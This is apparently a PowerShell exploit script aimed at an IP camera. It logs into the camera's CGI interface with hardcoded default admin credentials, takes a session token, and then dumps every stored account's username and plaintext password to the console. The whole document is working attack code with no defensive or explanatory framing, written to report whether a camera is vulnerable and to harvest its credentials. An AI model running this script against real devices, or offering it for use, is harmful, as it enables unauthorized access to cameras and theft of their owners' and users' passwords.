param(
    [Parameter(Mandatory=$true)]
    [string]$CameraIP
)

Write-Host "[*] Connecting to camera at $CameraIP..."

try {
    $loginUrl = "http://$CameraIP/cgi-bin/web.cgi?mod=session&cmd=login1"
    $r = Invoke-WebRequest $loginUrl -Headers @{"Authorization"="Basic YWRtaW46YWRtaW4="} -ErrorAction Stop
    $sid = $r.Headers["Session-Id"]

    if (-not $sid) {
        Write-Host "[-] No Session-Id received. Camera may not be vulnerable or IP is wrong."
        exit 1
    }

    Write-Host "[+] Session token obtained: $sid"

    $accountUrl = "http://$CameraIP/cgi-bin/web.cgi?mod=account&cmd=list"
    $accounts = Invoke-WebRequest $accountUrl -Headers @{"Session-Id"=$sid} -ErrorAction Stop

    Write-Host "[+] Accounts found:"
    $accounts.Content | ConvertFrom-Json | ForEach-Object {
        Write-Host "    Username: $($_.name)  |  Password: $($_.pwd)"
    }
} catch {
    Write-Host "[-] Error: $_"
}
